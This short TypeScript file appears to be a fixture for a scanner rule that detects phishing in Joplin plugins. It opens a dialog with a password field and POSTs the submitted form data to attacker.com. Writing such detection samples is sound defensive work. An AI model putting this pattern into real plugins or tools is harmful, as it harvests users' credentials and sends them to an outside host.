// Mock dependencies to avoid TS errors
import * as joplin from 'api';
import fetch from 'node-fetch';

async function triggerRule() {
    // Rule 13 : Social Engineering & UI Phishing
    // Flow 1: dialog submission -> network sink
    await joplin.views.dialogs.setHtml('phish_r13', '<input type="password">');
    const r13 = await joplin.views.dialogs.open('phish_r13');
    fetch('http://attacker.com', { method: 'POST', body: JSON.stringify(r13.formData) });
}

export {};
